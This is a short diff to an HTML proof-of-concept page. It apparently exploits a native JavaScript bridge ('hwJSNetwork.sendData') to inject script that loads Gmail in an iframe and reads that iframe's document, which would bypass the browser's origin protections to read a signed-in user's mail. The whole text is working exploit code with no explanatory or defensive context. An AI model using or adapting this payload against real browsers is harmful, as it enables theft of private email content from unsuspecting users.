@@ -1,5 +1,7 @@
+<body>
+<iframe src="https://mail.google.com/mail/" id="me2"></iframe>
 <script>
-  <iframe src="https://mail.google.com/mail/" id="me2"></iframe>
   hwJSNetwork.sendData("https://", "GET", "", "", "var i = document.createElement('iframe'); i.id = 'me'; i.src = 'https://mail.google.com/mail/'; window.document.body.appendChild(i); dummy");
   hwJSNetwork.sendData("https://", "GET", "", "", "window.alert(1); var body = window.document.getElementById('me').contentDocument; window.alert(body); dummy");
 </script>
+</body>
